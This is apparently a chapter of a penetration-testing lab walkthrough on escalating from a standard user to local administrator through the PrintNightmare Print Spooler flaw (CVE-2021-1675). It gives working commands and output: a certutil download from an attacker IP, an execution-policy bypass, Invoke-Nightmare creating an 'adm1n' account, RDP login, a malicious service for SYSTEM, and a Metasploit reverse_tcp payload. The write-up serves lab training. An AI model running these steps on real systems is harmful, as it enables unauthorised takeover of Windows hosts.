# 06 — Privilege escalation — PrintNightmare

Goal: go from a standard user to a local administrator on a build-19041 host with the Spooler running
and no `SeImpersonatePrivilege` to abuse.

---

## 6.1 Why this vulnerability fits this token

PrintNightmare abuses the Print Spooler's `RpcAddPrinterDriverEx` interface. The Spooler runs as
**SYSTEM**, and it will load a print driver DLL from a path the caller supplies. Historically it did
not require the caller to be an administrator for every code path, and it never validated that the
DLL came from a trusted location. The result:

> any authenticated local user can make a SYSTEM service load their DLL.

Two CVE identifiers matter, and it is worth knowing which is which:

| CVE | What it is |
|---|---|
| **CVE-2021-1675** | the original "Print Spooler RCE" — the `AddPrinterDriverEx` path traversal/loading flaw |
| **CVE-2021-34527** | the *bypass* of the July 2021 patch — the remote/`\\attacker\share` variant that made it famous |

The classic `Invoke-Nightmare` script targets the 1675 interface locally and needs only a normal user
session. That is exactly the situation after chapter 05: no impersonate privilege, no admin group
membership, but a live Spooler.

Precondition, restated: **`spoolsv.exe` must be running.** SNMP confirmed it in chapter 02, before we
ever had a shell.

---

## 6.2 Get the script onto the box

From a Meterpreter session:

```
cd C:\Users\offsec\AppData\Local\Temp
upload /opt/tools/cve-2021-1675.ps1
load powershell
powershell_shell
```

Without Meterpreter, `certutil` works on this image family where other transfers do not:

```cmd
cd C:\Users\offsec\AppData\Local\Temp
certutil -urlcache -split -f http://192.168.45.158/cve-2021-1675.ps1 cve-2021-1675.ps1
powershell -ep bypass
```

`-ep bypass` matters: the default execution policy would refuse the unsigned script.

---

## 6.3 Run it

```powershell
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare
```

```
PS C:\Users\offsec\AppData\Local\Temp> Import-Module .\cve-2021-1675.ps1
PS C:\Users\offsec\AppData\Local\Temp> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\offsec\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\WINDOWS\System32\DriverStore\FileRepository\ntprin
[+] added user  as local administrator
[+] deleting payload from C:\Users\offsec\AppData\Local\Temp\nightmare.dll
```

Read the output line by line:

| Line | Meaning |
|---|---|
| `using default new user: adm1n` | the script defaults to creating `adm1n` / `P@ssw0rd`; pass `-NewUser`/`-NewPassword` to change |
| `created payload at …\nightmare.dll` | a DLL that calls `NetLocalGroupAddMembers` when the Spooler loads it |
| `using pDriverPath … ntprint.inf_amd64_…` | an existing, signed printer driver INF used as the vehicle |
| `added user  as local administrator` | **the blank name is a bug in the script's string formatting, not a failure.** The account created is `adm1n` |
| `deleting payload …` | it cleans the DLL up itself; no artifact left in TEMP |

That blank field is worth flagging explicitly, because the obvious reading — "it added *nothing*" —
is wrong, and people re-run the exploit chasing a failure that did not happen. The proof is the next
command, not the message.

---

## 6.4 Verify before you use it

```powershell
net user adm1n
net localgroup administrators
```

```
User name                    adm1n
Local Group Memberships      *Administrators
```

If `adm1n` is absent, the Spooler rejected the driver load — check `Get-Service Spooler`, and look at
`C:\Windows\System32\spool\drivers\x64\3\` for leftovers. If the account exists but is not in
`Administrators`, the DLL ran but the group call failed; create the membership manually from the
SYSTEM context it gave you.

---

## 6.5 Use the account

An administrator session is what you need for the flag; a *network* logon is not the same as an
interactive one, so RDP is the cleanest route:

```bash
xfreerdp /u:adm1n /v:192.168.103.145 /p:'P@ssw0rd' /cert:ignore +clipboard
```

```
xfreerdp /u:adm1n /v:192.168.103.145 /p:'P@ssw0rd'
```

Notes that save time:

- The password contains characters the shell will happily eat — **single-quote it** in bash.
- RDP was `filtered` in the original scan. It answered once the lab was refreshed; re-scan before
  concluding it is closed.
- If RDP is genuinely unavailable, an admin context is also reachable with
  `runas /user:adm1n cmd` from any shell, or `psexec.py`/`wmiexec.py` with those credentials — but
  those give you a network logon and a non-interactive desktop, which matters if the flag is on a
  user's desktop.

### Why an admin and not SYSTEM

`adm1n` is a **local administrator**, which is enough to read `proof.txt` and to take ownership of
any profile's files. It is *not* SYSTEM. If a box required SYSTEM specifically, the next step from
here is one command — make the account's payload a service:

```cmd
sc create pwn binPath= "cmd /c C:\Users\offsec\AppData\Local\Temp\s.bat" start= auto
sc start pwn
```

or simply re-use the admin token with `getsystem` from a Meterpreter session running as `adm1n`
(that token *does* carry `SeImpersonatePrivilege`, so the potato path opens up).

---

## 6.6 Alternatives if the script is blocked

| Route | Command |
|---|---|
| Metasploit module | `use exploit/windows/local/cve_2021_1675_printnightmare`, `set SESSION`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `run` |
| SharpPrintNightmare | `SharpPrintNightmare.exe C:\Windows\System32\spool\drivers\x64\3\evil.dll` (remote variant takes a UNC path) |
| Manual | `RpcAddPrinterDriverEx` via `Invoke-PrintNightmare`/`PrintNightmare.py` from cube0x0 |

All of them need the same two things: an authenticated local session and a running Spooler.

---

## 6.7 Does this box even need SYSTEM?

Worth saying out loud, because it changes how much work you do: on this host the flag was readable
from the **administrator's** context, and PrintNightmare delivered exactly that. Escalating further to
SYSTEM would have been ceremony, not progress.

Judge the requirement from what you actually need to read, not from a habit of "always get SYSTEM".
